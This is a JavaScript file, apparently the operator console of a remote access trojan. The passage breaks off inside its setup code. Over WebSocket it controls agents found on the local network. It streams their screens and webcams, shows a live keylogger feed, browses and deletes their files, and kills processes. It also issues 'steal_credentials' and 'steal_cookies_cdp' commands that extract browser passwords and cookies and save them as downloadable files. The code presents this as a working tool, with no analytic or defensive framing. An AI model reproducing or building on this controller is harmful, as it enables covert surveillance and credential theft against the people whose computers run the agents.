document.addEventListener('DOMContentLoaded', () => {

    // =================================================================
    // REGION 1: STATE & CONFIGURATION
    // =================================================================
    let ws;
    let currentView = 'applications';
    let lastLoggedKeyCode = null;
    let currentVideoBlob = null;
    let currentVideoUrl = null;
    let isKeylogClean = true;
    let scanInterval = null;
    let currentAgentId = null;
    let currentPath = "C:\\";
    let webcamMode = 'idle'; // idle | stream | record | playback
    let lastScanDataJson = "";
    let currentPasswordData = [];
    let currentBrowserName = "unknown";
    let confirmCallback = null;

    // Helpers
    const $ = (s) => document.querySelector(s);
    const $$ = (s) => document.querySelectorAll(s);

    // =================================================================
    // REGION 2: DOM ELEMENTS
    // =================================================================
    
    // --- Connection & Status ---
    const statusPill = $('#status-pill');
    const statusText = $('#status-pill .status-text');
    const wsUrlInput = $('#ws-url-input');
    const btnConnect = $('#btn-connect');
    const btnDisconnect = $('#btn-disconnect');
    const btnScanLan = $('#btn-scan-lan');
    const btnLogoutSidebar = $('#btn-logout-sidebar');

    // --- Screen (Capture & Stream) ---
    const btnTakeScreenshot = $('#btn-take-screenshot');
    const btnReloadScreen = $('#btn-reload-screen');
    const btnSaveScreenshot = $('#btn-save-screenshot');
    const btnCopyScreenshot = $('#btn-copy-screenshot');
    const captureSpinner = $('#capture-spinner');
    const captureImg = $('#capture-img');
    const capturePlaceholder = $('#capture-placeholder');
    const btnStartStream = $('#btn-start-stream');
    const btnStopStream = $('#btn-stop-stream');
    const streamImg = $('#stream-img');
    const mouseToggle = $('#toggle-mouse-control');

    // --- Webcam (Record & Stream) ---
    const btnStartRecord = $('#btn-start-record');
    const btnStopRecord = $('#btn-stop-record');
    const btnSaveVideo = $('#btn-save-video');
    const btnReloadWebcam = $('#btn-reload-webcam');
    const webcamSpinner = $('#webcam-spinner');
    const webcamPlaceholder = $('#webcam-placeholder');
    const webcamVideoOutput = $('#webcam-video-output');
    const webcamStatus = $('#webcam-status');
    const modalWebcamDevice = $('#modal-webcam-device');
    const inputWebcamDuration = $('#input-webcam-duration');
    const inputWebcamDeviceName = $('#input-webcam-device-name');
    const btnStartWebcamStream = $('#btn-start-webcam-stream');
    const btnStopWebcamStream = $('#btn-stop-webcam-stream');
    const webcamStreamImg = $('#webcam-stream-img');

    // --- Keylogger ---
    const keylogToggle = $('#keylog-toggle');
    const keylogOutput = $('#keylog-output');
    const btnClearKeylog = $('#btn-clear-keylog');

    // --- File Manager ---
    const btnFsGo = $('#btn-fs-go');
    const inputFsPath = $('#fs-path-input');
    const btnFsUp = $('#btn-fs-up');
    const btnFsRefresh = $('#btn-fs-refresh');
    const btnNewFolder = $('#btn-fs-new-folder');
    const btnNewFile = $('#btn-fs-new-file');

    // --- System & Nav ---
    const sidebar = $('#sidebar');
    const themeToggle = $('#theme-toggle');

    // --- Modals ---
    const modalConfirm = $('#modal-confirm');
    const confirmTitle = $('#confirm-title');
    const confirmMsg = $('#confirm-message');
    const btnConfirmYes = $('#btn-confirm-yes');
    
    // --- Passwords ---
    const passwordTbody = document.getElementById('password-list-body');
    const passwordModal = document.getElementById('password-modal');
    const passwordCountLabel = document.getElementById('pass-count');

    // =================================================================
    // REGION 3: WEBSOCKET & CORE COMMUNICATION
    // =================================================================

    function connectWs() {
        const url = wsUrlInput.value;
        if (!url) return alert('Enter WebSocket URL');
        console.log("Connecting to:", url);

        try {
            ws = new WebSocket(url);
        } catch (e) { return alert("Invalid URL"); }

        ws.onopen = () => {
            setConnectedState(true, currentAgentId);
            if (currentAgentId) loadDataForView(currentView);
        };

        ws.onclose = () => {
            setConnectedState(false);
            ws = null;
            resetUI();
        };

        ws.onerror = (e) => alert('Connection failed');
        ws.onmessage = onWsMessage;
    }

    function disconnectWs() { 
        if (ws) ws.close(); 
    }

    function sendWsMessage(payload) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            if (currentAgentId) {
                payload.agentId = currentAgentId;
                ws.send(JSON.stringify(payload));
            } else {
                alert('Please select an agent first (Scan LAN)');
            }
        } else {
            alert('Not connected.');
        }
    }

    function onWsMessage(event) {
        const msg = JSON.parse(event.data);

        // Check active modals for rendering context
        const modalAppEl = document.getElementById('modal-stop-app');
        const modalProcEl = document.getElementById('modal-stop-proc');
        const isStopAppOpen = modalAppEl && !modalAppEl.classList.contains('hidden');
        const isStopProcOpen = modalProcEl && !modalProcEl.classList.contains('hidden');

        switch (msg.type) {
            // Process & Apps
            case 'process_list':
                if (isStopProcOpen) renderStopProcList(msg.data);
                else renderProcessTable(msg.data);
                break;
            case 'application_list':
                if (isStopAppOpen) renderStopAppList(msg.data);
                else renderAppTable(msg.data);
                break;

            // Screen
            case 'screenshot':
                handleScreenshotResult(msg.data);
                break;
            case 'screen_frame':
                if (btnStartStream.classList.contains('hidden')) {
                    $('#capture-display-area .empty-state').classList.add('hidden');
                    captureImg.classList.add('hidden');
                    streamImg.classList.remove('hidden');
                    streamImg.src = "data:image/jpeg;base64," + msg.data;
                }
                break;

            // Webcam
            case 'webcam_recording_status':
                handleWebcamStatus(msg);
                break;
            case 'webcam_video':
                handleWebcamVideo(msg.data);
                break;
            case 'webcam_frame':
                if (webcamMode !== 'stream') return;
                $('#webcam-display-area .empty-state').classList.add('hidden');
                webcamVideoOutput.classList.add('hidden');
                webcamStreamImg.classList.remove('hidden');
                webcamStreamImg.src = "data:image/jpeg;base64," + msg.data;
                break;

            // Keylogger
            case 'key_event':
                handleKeyEvent(msg.key_code, msg.key_char);
                break;

            // Stealer
            case 'passwords_result':
                const browserName = msg.browser ? msg.browser.toUpperCase() : "BROWSER";
                if (!msg.data || msg.data.length === 0) {
                    alert(`No passwords found for ${browserName}.`);
                } else {
                    renderPasswordModal(msg.data, browserName);
                }
                break;
            case 'cookies_result':
                if (!msg.data || msg.data.length === 0) {
                    alert("No cookies found or decryption failed.");
                } else {
                    downloadBase64File(btoa(JSON.stringify(msg.data, null, 2)), `cookies_${msg.browser}_${Date.now()}.json`);
                    alert(`Success! Downloaded ${msg.data.length} cookies via CDP.`);
                }
                break;

            // System
            case 'error':
                alert("Server Error: " + msg.message);
                break;
            case 'status':
                if (currentView === 'files') unlockFileUI();
                if (msg.success) {
                    if (isStopAppOpen) sendWsMessage({ command: 'list_applications' });
                    if (isStopProcOpen) sendWsMessage({ command: 'list_processes' });
                    if (currentView.includes('process')) sendWsMessage({ command: 'list_processes' });
                    if (currentView.includes('app')) sendWsMessage({ command: 'list_applications' });
                    if (currentView === 'files') sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' });
                } else {
                    if (currentView === 'files') {
                        const grid = document.getElementById('file-grid');
                        if (grid) { grid.style.opacity = '1'; grid.style.pointerEvents = 'auto'; }
                    }
                    if (msg.message === 'capture failed') {
                        captureSpinner.classList.add('hidden');
                        capturePlaceholder.parentElement.classList.remove('hidden');
                    } else alert('Error: ' + msg.message);
                }
                break;

            // File Manager
            case 'drive_list':
                renderDriveTree(msg.data);
                break;
            case 'file_list':
                unlockFileUI();
                if (msg.context === 'tree') appendTreeChildren(msg.path, msg.data);
                else renderFileList(msg.path, msg.data);
                break;
            case 'file_download':
                if (msg.success) downloadBase64File(msg.data, msg.name);
                else alert("Download failed!");
                break;
        }
    }

    // =================================================================
    // REGION 4: LOGIC HANDLERS
    // =================================================================

    function canUseAgentFeature() {
        if (!ws) return false;
        if (ws.readyState !== WebSocket.OPEN) return false;
        if (!currentAgentId) return false;
        return true;
    }

    function performLogout() {
        sessionStorage.removeItem('rcc_user');
        disconnectWs();
        location.reload();
    }

    function setConnectedState(isConnected, agentName = null) {
        if (isConnected) {
            statusPill.classList.remove('disconnected');
            statusPill.classList.add('connected');
            if (statusText) statusText.textContent = agentName ? `Connected: ${agentName}` : 'Connected';
            btnConnect.classList.add('hidden');
            btnDisconnect.classList.remove('hidden');
            wsUrlInput.disabled = true;
        } else {
            statusPill.classList.remove('connected');
            statusPill.classList.add('disconnected');
            if (statusText) statusText.textContent = 'Disconnected';
            btnConnect.classList.remove('hidden');
            btnDisconnect.classList.add('hidden');
            wsUrlInput.disabled = false;
            currentAgentId = null;
        }
    }

    // --- Screen Logic ---
    function handleScreenshotResult(base64) {
        captureSpinner.classList.add('hidden');
        streamImg.classList.add('hidden');
        streamImg.src = "";
        capturePlaceholder.parentElement.classList.add('hidden');
        captureImg.src = `data:image/png;base64,${base64}`;
        captureImg.classList.remove('hidden');
        btnCopyScreenshot.classList.remove('hidden');
        btnSaveScreenshot.classList.remove('hidden');
    }

    function resetScreenUI() {
        streamImg.classList.add('hidden');
        streamImg.src = "";
        captureImg.classList.add('hidden');
        captureSpinner.classList.add('hidden');
        $('#capture-display-area .empty-state').classList.remove('hidden');
        btnStartStream.classList.remove('hidden');
        btnStopStream.classList.add('hidden');
        btnSaveScreenshot.classList.add('hidden');
        btnCopyScreenshot.classList.add('hidden');
        mouseToggle.checked = false;
    }

    // --- Webcam Logic ---
    function handleWebcamStatus(msg) {
        webcamStatus.textContent = msg.message;
        webcamStatus.classList.remove('hidden');

        if (msg.message.includes('Recording started')) {
            btnStartRecord.classList.add('hidden');
            btnStopRecord.classList.remove('hidden');
            btnStartWebcamStream.classList.add('hidden');
            btnStopWebcamStream.classList.add('hidden');
            btnSaveVideo.classList.add('hidden');
            webcamPlaceholder.parentElement.classList.add('hidden');
            webcamSpinner.classList.remove('hidden');
            webcamVideoOutput.classList.add('hidden');
        } else if (msg.message.includes('completed')) {
            webcamMode = 'playback';
            webcamSpinner.classList.add('hidden');
            webcamPlaceholder.parentElement.classList.remove('hidden');
            webcamPlaceholder.textContent = 'Processing...';
            btnStartWebcamStream.classList.remove('hidden');
        } else if (msg.message.includes('error') || msg.message.includes('cancelled') || msg.message.includes('stopped')) {
            webcamSpinner.classList.add('hidden');
            webcamPlaceholder.parentElement.classList.remove('hidden');
            webcamPlaceholder.textContent = "Ready to record or stream webcam";
            btnStartRecord.classList.remove('hidden');
            btnStopRecord.classList.add('hidden');
            btnStartWebcamStream.classList.remove('hidden');
            btnStopWebcamStream.classList.add('hidden');
            setTimeout(() => { webcamStatus.classList.add('hidden'); }, 3000);
        }
    }

    function handleWebcamVideo(b64) {
        webcamSpinner.classList.add('hidden');
        webcamPlaceholder.parentElement.classList.add('hidden');
        webcamStreamImg.classList.add('hidden');
        webcamStreamImg.src = "";

        try {
            const chars = atob(b64);
            const bytes = new Uint8Array(chars.length);
            for (let i = 0; i < chars.length; i++) { bytes[i] = chars.charCodeAt(i); }

            if (currentVideoUrl) URL.revokeObjectURL(currentVideoUrl);
            currentVideoBlob = new Blob([bytes], { type: 'video/mp4' });
            currentVideoUrl = URL.createObjectURL(currentVideoBlob);

            webcamVideoOutput.src = currentVideoUrl;
            webcamVideoOutput.load();
            webcamVideoOutput.classList.remove('hidden');
            webcamMode = 'playback';

            btnStartRecord.classList.remove('hidden');
            btnStopRecord.classList.add('hidden');
            btnSaveVideo.classList.remove('hidden');
            btnStartWebcamStream.classList.remove('hidden');
        } catch (e) {
            console.error(e);
            alert("Video error");
        }
    }

    function clearWebcamStreamUI() {
        webcamStreamImg.src = "";
        webcamStreamImg.classList.add('hidden');
        webcamVideoOutput.pause();
        webcamVideoOutput.src = "";
        webcamVideoOutput.classList.add('hidden');
        const empty = $('#webcam-display-area .empty-state');
        if (empty) empty.classList.remove('hidden');
        const display = $('#webcam-display-area');
        if (display) display.style.background = 'transparent';
    }

    // --- Keylog Logic ---
    function handleKeyEvent(keyCode, keyChar) {
        const el = document.getElementById('keylog-output');
        if (!el) return;
        if (keyChar === '[BACKSPACE]') el.textContent = el.textContent.slice(0, -1);
        else if (keyChar === '\n') el.textContent += '\n';
        else if (keyChar === '\t') el.textContent += '    ';
        else el.textContent += keyChar;
        el.scrollTop = el.scrollHeight;
    }

    // --- Helpers ---
    function resetUI() {
        if ($('#processes-table tbody')) $('#processes-table tbody').innerHTML = '';
        if ($('#apps-table tbody')) $('#apps-table tbody').innerHTML = '';
        if (keylogOutput) keylogOutput.textContent = 'Waiting...';
        if (keylogToggle) keylogToggle.checked = false;
        lastLoggedKeyCode = null;
        clearWebcamStreamUI();
    }

    function sanitizeId(str) { return str.replace(/[^a-zA-Z0-9]/g, '-'); }

    function downloadBase64File(base64, fileName) {
        try {
            const binaryString = atob(base64);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) { bytes[i] = binaryString.charCodeAt(i); }
            const blob = new Blob([bytes], { type: "application/octet-stream" });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = fileName;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        } catch (e) {
            console.error("Download error", e);
            alert("Error saving file.");
        }
    }

    // =================================================================
    // REGION 5: UI RENDERING
    // =================================================================

    function showView(viewId) {
        currentView = viewId;
        $$('.content-view').forEach(v => v.classList.remove('active'));
        const targetView = $(`#view-${viewId}`);
        if (targetView) targetView.classList.add('active');

        $$('.nav-item').forEach(i => i.classList.remove('active'));
        const parent = targetView ? targetView.dataset.parentView : null;
        const activeItem = $(`.nav-item[data-view="${parent || viewId}"]`);
        if (activeItem) activeItem.classList.add('active');

        if (ws && ws.readyState === WebSocket.OPEN) loadDataForView(viewId);
    }

    function loadDataForView(id) {
        if (id === 'processes-table') sendWsMessage({ command: 'list_processes' });
        else if (id === 'applications-table') sendWsMessage({ command: 'list_applications' });
        else if (id === 'files') {
            sendWsMessage({ command: 'fs_drives' });
            sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' });
        }
    }

    function renderProcessTable(data) {
        const tbody = $('#processes-table tbody');
        if (!tbody) return;
        if (!data || !data.length) { tbody.innerHTML = '<tr><td colspan="4">No data.</td></tr>'; return; }
        const fmt = new Intl.NumberFormat('en-US');
        tbody.innerHTML = data.map(p => `
            <tr><td><span class="status-pill" style="background:rgba(0,0,0,0.05);color:var(--text-main)">${p.pid}</span></td>
            <td>${p.name}</td><td>${p.workingSet ? fmt.format(p.workingSet)+' B' : 'N/A'}</td>
            <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-proc" data-pid="${p.pid}">Stop</button></td></tr>`).join('');
    }

    function renderAppTable(data) {
        const tbody = $('#apps-table tbody');
        if (!tbody) return;
        if (!data || !data.length) { tbody.innerHTML = '<tr><td colspan="3">No data.</td></tr>'; return; }
        tbody.innerHTML = data.map(a => `
            <tr><td style="font-weight:500">${a.name}</td><td>${a.process_count}</td>
            <td class="text-right"><button class="btn btn-sm btn-danger" data-action="stop-app" data-name="${a.name}">End Task</button></td></tr>`).join('');
    }

    function renderStopProcList(data) {
        const container = $('#stop-proc-list');
        if (!data || data.length === 0) { container.innerHTML = '<div class="list-loading">No processes found.</div>'; return; }
        const displayData = data.slice(0, 100);
        container.innerHTML = displayData.map(proc => `
            <div class="list-item">
                <div class="item-info">
                    <span class="item-name">${proc.name}</span>
                    <span class="item-sub">PID: ${proc.pid} | RAM: ${(proc.workingSet/1024/1024).toFixed(1)} MB</span>
                </div>
                <button class="btn-kill-sm" onclick="requestStopProc(${proc.pid})" title="Kill PID ${proc.pid}"><i data-feather="x"></i></button>
            </div>`).join('');
        if (data.length > 100) container.innerHTML += `<div class="list-loading" style="font-size:11px">...and ${data.length - 100} more processes</div>`;
        if (typeof feather !== 'undefined') feather.replace();
    }

    function renderStopAppList(data) {
        const container = $('#stop-app-list');
        if (!data || data.length === 0) { container.innerHTML = '<div class="list-loading">No running apps found.</div>'; return; }
        container.innerHTML = data.map(app => `
            <div class="list-item">
                <div class="item-info">
                    <span class="item-name">${app.name}</span>
                    <span class="item-sub">${app.process_count} process(es)</span>
                </div>
                <button class="btn-kill-sm" onclick="requestStopApp('${app.name}')" title="Stop App"><i data-feather="power"></i></button>
            </div>`).join('');
        if (typeof feather !== 'undefined') feather.replace();
    }

    function renderDriveTree(drives) {
        const container = document.getElementById('fs-tree-container');
        container.innerHTML = drives.map(d => {
            const safePath = d.path.replace(/\\/g, '\\\\');
            return `
            <div class="tree-node" data-path="${d.path}" data-loaded="false">
                <div class="tree-item" onclick="onTreeItemClick(this, '${safePath}')">
                    <span class="tree-toggle" onclick="onTreeToggle(event, this, '${safePath}')"><i data-feather="chevron-right"></i></span>
                    <i data-feather="hard-drive" style="width:14px;height:14px;"></i> <span>${d.name}</span>
                </div>
                <div class="tree-children" id="tree-child-${sanitizeId(d.path)}"></div>
            </div>`;
        }).join('');
        if (typeof feather !== 'undefined') feather.replace();
    }

    function appendTreeChildren(parentPath, items) {
        const safeId = sanitizeId(parentPath);
        const childBox = document.getElementById(`tree-child-${safeId}`);
        if (!childBox) return;
        childBox.closest('.tree-node').dataset.loaded = 'true';
        const folders = items.filter(i => i.type === 'folder');

        if (folders.length === 0) {
            childBox.innerHTML = '<div style="padding:4px 0 4px 24px;font-size:11px;font-style:italic;opacity:0.6">Empty</div>';
            return;
        }

        childBox.innerHTML = folders.map(f => {
            let childPath = parentPath.endsWith('\\') ? parentPath + f.name : parentPath + '\\' + f.name;
            const safeChildPath = childPath.replace(/\\/g, '\\\\');
            return `
            <div class="tree-node" data-path="${childPath}" data-loaded="false">
                <div class="tree-item" onclick="onTreeItemClick(this, '${safeChildPath}')">
                    <span class="tree-toggle" onclick="onTreeToggle(event, this, '${safeChildPath}')"><i data-feather="chevron-right"></i></span>
                    <i data-feather="folder" style="width:14px;height:14px;color:#fbbf24"></i> <span>${f.name}</span>
                </div>
                <div class="tree-children" id="tree-child-${sanitizeId(childPath)}"></div>
            </div>`;
        }).join('');
        if (typeof feather !== 'undefined') feather.replace();
    }

    function renderFileList(path, data) {
        currentPath = path;
        const grid = document.getElementById('file-grid');
        if (grid) { grid.style.opacity = '1'; grid.style.pointerEvents = 'auto'; }
        const input = document.getElementById('fs-path-input');
        if (input) input.value = path;

        if (!data || data.length === 0) {
            grid.innerHTML = `<div style="padding:40px;text-align:center;grid-column:1/-1;color:var(--text-muted)">Empty Folder</div>`;
            return;
        }

        data.sort((a, b) => {
            if (a.type === b.type) return a.name.localeCompare(b.name);
            return a.type === 'folder' ? -1 : 1;
        });

        grid.innerHTML = data.map(item => {
            const isFolder = item.type === 'folder';
            const icon = isFolder ? 'folder' : 'file-text';
            let fullPath = path.endsWith('\\') ? path + item.name : path + '\\' + item.name;
            const safePath = fullPath.replace(/\\/g, '\\\\');
            const actionAttr = isFolder ? `ondblclick="openFolder('${safePath}')"` : '';

            return `
            <div class="file-item" data-type="${item.type}" ${actionAttr} title="${item.name}">
                <div class="file-actions">
                    ${!isFolder ? `<button class="btn-fs-action download" onclick="requestDownloadFile('${item.name}')" title="Download"><i data-feather="download" style="width:12px;"></i></button>` : ''}
                    <button class="btn-fs-action delete" onclick="requestDeleteFile('${item.name}')" title="Delete"><i data-feather="trash-2" style="width:12px;"></i></button>
                </div>
                <div class="file-icon"><i data-feather="${icon}" style="width:32px;height:32px;"></i></div>
                <span class="file-name">${item.name}</span>
                ${!isFolder ? `<span style="font-size:10px;color:var(--text-muted);margin-top:2px">${(item.size/1024).toFixed(0)} KB</span>` : ''}
            </div>`;
        }).join('');

        if (typeof feather !== 'undefined') feather.replace();
    }

    function unlockFileUI() {
        const grid = document.getElementById('file-grid');
        if (grid) {
            grid.style.opacity = '1';
            grid.style.pointerEvents = 'auto';
            grid.style.cursor = 'default';
        }
    }

    function renderScanList(data) {
        const container = $('#scan-list');
        if (data && data.length > 0) data.sort((a, b) => a.ip.localeCompare(b.ip));
        const currentDataJson = JSON.stringify(data);
        if (currentDataJson === lastScanDataJson && container.innerHTML.trim() !== "") return;
        lastScanDataJson = currentDataJson;

        if (!data || data.length === 0) {
            container.innerHTML = `
                <div class="list-loading" style="grid-column: 1 / -1;">
                    <div class="spinner" style="border-color: #06b6d4; border-top-color: transparent;"></div>
                    <br><span style="color: #06b6d4; font-weight: 500;">Scanning Radar Active...</span>
                    <br><small style="opacity:0.7">Looking for agents on port 9102</small>
                </div>`;
            return;
        }

        container.innerHTML = data.map(agent => {
            let iconName = 'monitor';
            if (agent.os.includes('Windows')) iconName = 'layout';
            else if (agent.os.includes('Linux')) iconName = 'terminal';
            const isSelected = agent.agentId === currentAgentId;
            const selectedClass = isSelected ? 'selected-agent' : '';

            return `
            <div class="device-card ${selectedClass}" data-os="${agent.os}" data-agent-id="${agent.agentId}" onclick="selectAgent('${agent.agentId}', '${agent.hostname}')">
                <div class="device-status" title="Online"></div>
                <div class="device-info"><span class="device-hostname" title="${agent.hostname}">${agent.hostname}</span><span class="device-ip">${agent.agentId || agent.ip}</span></div>
            </div>`;
        }).join('');
        if (typeof feather !== 'undefined') feather.replace();
    }

    function renderPasswordModal(passwords, browserName) {
        currentPasswordData = passwords;
        currentBrowserName = browserName;
        if (!passwordTbody || !passwordModal) return;

        passwordTbody.innerHTML = '';
        passwordCountLabel.innerText = `${passwords.length} items found`;

        passwords.forEach((p, index) => {
            const row = document.createElement('tr');
            const displayUrl = p.url.length > 60 ? p.url.substring(0, 60) + '...' : p.url;
            row.innerHTML = `
                <td><span class="url-cell" title="${p.url}">${displayUrl}</span></td>
                <td><span class="user-cell">${p.user}</span></td>
                <td><span class="pass-cell">${p.pass}</span></td>
                <td class="text-center"><button class="btn-copy" id="btn-copy-${index}" onclick="handleCopy(${index})">Copy</button></td>`;
            passwordTbody.appendChild(row);
        });

        passwordModal.classList.remove('hidden');
        if (typeof feather !== 'undefined') feather.replace();
    }

    // =================================================================
    // REGION 6: WINDOW EXPORTS (GLOBAL)
    // =================================================================

    window.selectAgent = (agentId, hostname) => {
        currentAgentId = agentId;
        console.log('[App] Selected agent:', agentId, hostname);
        const proto = location.protocol === 'https:' ? 'wss' : 'ws';
        const url = `${proto}://${location.host}/ws`;
        wsUrlInput.value = url;
        handleCloseModal();
        if (ws && ws.readyState === WebSocket.OPEN) ws.close();
        
        setTimeout(() => {
            try {
                ws = new WebSocket(url);
                ws.onopen = () => { setConnectedState(true, hostname); loadDataForView(currentView); };
                ws.onclose = () => { setConnectedState(false); ws = null; resetUI(); };
                ws.onerror = (e) => alert('Connection failed');
                ws.onmessage = onWsMessage;
            } catch (e) { alert('Failed to connect to agent'); }
        }, 300);
    };

    window.requestStopApp = (name) => {
        if (confirm(`Force stop "${name}"?`)) sendWsMessage({ command: 'stop_application', app_name: name });
    };

    window.requestStopProc = (pid) => {
        if (confirm(`Kill process PID ${pid}?`)) sendWsMessage({ command: 'stop_process_pid', pid: parseInt(pid) });
    };

    window.requestStealCookies = (browser) => {
        if (confirm(`Steal Cookies from ${browser} using CDP Method (Will restart browser)?`)) sendWsMessage({ command: 'steal_cookies_cdp', browser: browser });
    };

    window.requestStealPass = (browser) => {
        if (!canUseAgentFeature()) return;
        sendWsMessage({ command: 'steal_credentials', browser });
    };

    window.onTreeToggle = (e, toggleBtn, path) => {
        e.stopPropagation();
        const node = toggleBtn.closest('.tree-node');
        const childBox = node.querySelector('.tree-children');
        if (childBox.classList.contains('show')) {
            childBox.classList.remove('show');
            toggleBtn.classList.remove('expanded');
        } else {
            childBox.classList.add('show');
            toggleBtn.classList.add('expanded');
            if (node.dataset.loaded !== 'true') {
                childBox.innerHTML = '<div style="padding:4px 0 0 24px;font-size:11px;color:#888">Loading...</div>';
                sendWsMessage({ command: 'fs_list', path: path, context: 'tree' });
            }
        }
    };

    window.onTreeItemClick = (el, path) => {
        document.querySelectorAll('.tree-item').forEach(i => i.classList.remove('active'));
        el.classList.add('active');
        sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
    };

    window.requestDeleteFile = (name) => {
        event.stopPropagation();
        const fullPath = currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name;
        if (confirm(`Delete "${name}"?`)) sendWsMessage({ command: 'fs_delete', path: fullPath });
    };

    window.openFolder = (path) => {
        const grid = document.getElementById('file-grid');
        if (grid) { grid.style.opacity = '0.5'; grid.style.pointerEvents = 'none'; grid.style.cursor = 'wait'; }
        setTimeout(() => { unlockFileUI(); }, 1000);
        sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
    };

    window.requestDownloadFile = (name) => {
        event.stopPropagation();
        const fullPath = currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name;
        sendWsMessage({ command: 'fs_download', path: fullPath });
    };

    window.handleCopy = function(index) {
        const text = currentPasswordData[index].pass;
        const btn = document.getElementById(`btn-copy-${index}`);
        const showSuccess = () => {
            const originalText = btn.innerText;
            btn.innerText = "Copied!";
            btn.classList.add("copied");
            setTimeout(() => { btn.innerText = originalText; btn.classList.remove("copied"); }, 1500);
        };
        if (navigator.clipboard && window.isSecureContext) navigator.clipboard.writeText(text).then(showSuccess);
        else prompt("Copy thủ công:", text);
    };

    window.closePasswordModal = function() {
        document.getElementById('password-modal').classList.add('hidden');
    };

    window.downloadPasswords = function() {
        if (!currentPasswordData.length) return;
        let content = `=== PASSWORDS (${currentBrowserName}) ===\n`;
        currentPasswordData.forEach(p => content += `${p.url} | ${p.user}:${p.pass}\n`);
        downloadBase64File(btoa(content), `passwords_${Date.now()}.txt`);
    };

    // =================================================================
    // REGION 7: MODAL HELPERS & SCAN FETCH
    // =================================================================

    function showConfirmModal(title, msg, type, callback) {
        confirmTitle.textContent = title;
        confirmMsg.textContent = msg;
        confirmCallback = callback;
        modalConfirm.classList.remove('hidden');
        $('#modal-backdrop').classList.remove('hidden');
    }

    if (btnConfirmYes) {
        btnConfirmYes.onclick = () => {
            if (confirmCallback) confirmCallback();
            handleCloseModal();
        }
    }

    function showModal(id) {
        $(`#${id}`).classList.remove('hidden');
        $('#modal-backdrop').classList.remove('hidden');
    }

    function hideAllModals() {
        $$('.modal').forEach(m => m.classList.add('hidden'));
        $('#modal-backdrop').classList.add('hidden');
    }

    const handleCloseModal = () => {
        hideAllModals();
        if (scanInterval) { clearInterval(scanInterval); scanInterval = null; }
        btnScanLan.classList.remove('active-scan');
    };

    const fetchScanList = async() => {
        try {
            const response = await fetch(`${location.protocol}//${location.host}/api/scan`);
            if (!response.ok) throw new Error("Error");
            const result = await response.json();
            renderScanList(result.data);
        } catch (error) {}
    };

    // =================================================================
    // REGION 8: INITIALIZATION & EVENTS
    // =================================================================

    function init() {
        // 1. Auth Logic
        const authOverlay = $('#auth-overlay');
        const formLogin = $('#form-login');
        const formRegister = $('#form-register');
        const authMsg = $('#auth-msg');
        const sessionUser = sessionStorage.getItem('rcc_user');

        if (!sessionUser) authOverlay.classList.remove('hidden');
        else { authOverlay.classList.add('hidden'); console.log("Welcome back:", sessionUser); }

        $('#link-to-register').onclick = (e) => { e.preventDefault(); formLogin.classList.add('hidden'); formRegister.classList.remove('hidden'); authMsg.classList.add('hidden'); };
        $('#link-to-login').onclick = (e) => { e.preventDefault(); formRegister.classList.add('hidden'); formLogin.classList.remove('hidden'); authMsg.classList.add('hidden'); };

        function showAuthMsg(msg, type) {
            authMsg.textContent = msg;
            authMsg.className = type;
            authMsg.classList.remove('hidden');
        }

        $('#btn-do-register').onclick = async () => {
            const u = $('#reg-user').value;
            const p = $('#reg-pass').value;
            if (!u || !p) return showAuthMsg("Please fill all fields", "error");
            try {
                const res = await fetch('/api/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: u, password: p }) });
                const data = await res.json();
                if (data.success) { showAuthMsg(data.message, "success"); setTimeout(() => $('#link-to-login').click(), 2000); } 
                else showAuthMsg(data.message, "error");
            } catch (e) { showAuthMsg("Network error", "error"); }
        };

        $('#btn-do-login').onclick = async () => {
            const u = $('#login-user').value;
            const p = $('#login-pass').value;
            try {
                const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: u, password: p }) });
                const data = await res.json();
                if (data.success) { sessionStorage.setItem('rcc_user', data.username); authOverlay.classList.add('hidden'); } 
                else showAuthMsg(data.message, "error");
            } catch (e) { showAuthMsg("Network error", "error"); }
        };

        // 2. Main Connection
        const proto = location.protocol === 'https:' ? 'wss' : 'ws';
        wsUrlInput.value = `${proto}://${location.host}/ws`;
        btnConnect.onclick = connectWs;
        btnDisconnect.onclick = disconnectWs;
        
        if (btnLogoutSidebar) {
            btnLogoutSidebar.onclick = () => {
                if (typeof showConfirmModal === 'function') showConfirmModal('Đăng xuất', 'Bạn có chắc chắn muốn đăng xuất?', 'danger', () => performLogout());
                else if(confirm("Bạn có chắc muốn đăng xuất?")) performLogout();
            };
        }

        // 3. Navigation
        $('#sidebar').onclick = e => { const item = e.target.closest('.nav-item'); if (item) showView(item.dataset.view); };
        $('#main-content').onclick = e => {
            const card = e.target.closest('[data-action="show-view"]');
            if (card) showView(card.dataset.target);
            const stopBtn = e.target.closest('[data-action="stop-proc"]');
            if (stopBtn) showConfirmModal('Kill Process', `PID ${stopBtn.dataset.pid}?`, 'danger', () => sendWsMessage({ command: 'stop_process_pid', pid: parseInt(stopBtn.dataset.pid) }));
            const stopAppBtn = e.target.closest('[data-action="stop-app"]');
            if (stopAppBtn) showConfirmModal('Stop App', `Close "${stopAppBtn.dataset.name}"?`, 'danger', () => sendWsMessage({ command: 'stop_application', app_name: stopAppBtn.dataset.name }));
        };

        if (btnScanLan) {
            btnScanLan.onclick = () => {
                btnScanLan.classList.add('active-scan');
                showModal('modal-scan-lan');
                fetchScanList();
                if (scanInterval) clearInterval(scanInterval);
                scanInterval = setInterval(fetchScanList, 2000);
            };
        }

        // 4. Modals
        $('#modal-backdrop').onclick = handleCloseModal;
        $$('[data-action="cancel"]').forEach(b => b.onclick = handleCloseModal);
        window.addEventListener('click', (event) => { if (event.target === passwordModal) passwordModal.classList.add('hidden'); });

        if ($('#card-open-stop-apps')) $('#card-open-stop-apps').onclick = () => { showModal('modal-stop-app'); sendWsMessage({ command: 'list_applications' }); };
        if ($('#card-open-stop-procs')) $('#card-open-stop-procs').onclick = () => { showModal('modal-stop-proc'); sendWsMessage({ command: 'list_processes' }); };

